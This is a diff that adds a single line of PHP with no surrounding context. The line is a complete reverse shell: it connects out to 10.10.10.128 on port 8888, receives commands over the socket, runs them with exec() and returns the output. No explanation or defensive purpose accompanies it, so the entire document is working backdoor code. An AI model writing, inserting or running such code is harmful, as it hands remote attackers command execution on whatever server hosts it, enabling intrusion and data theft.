@@ -1,0 +1,1 @@
+set_time_limit(0);$ip="10.10.10.128";$port="8888";$fp=@fsockopen($ip,$port,$errno,$errstr);if(!$fp){	echo "error";}else{fputs($fp,"\n++++++++++connet success++++++++\n");while (!feof($fp)) {fputs($fp,"shell:");$shell=fgets($fp);print_r($shell);exec($shell,$result);$message=implode("\n\r",$result)."\n\r";fputs($fp,$message);}fclose($fp);}
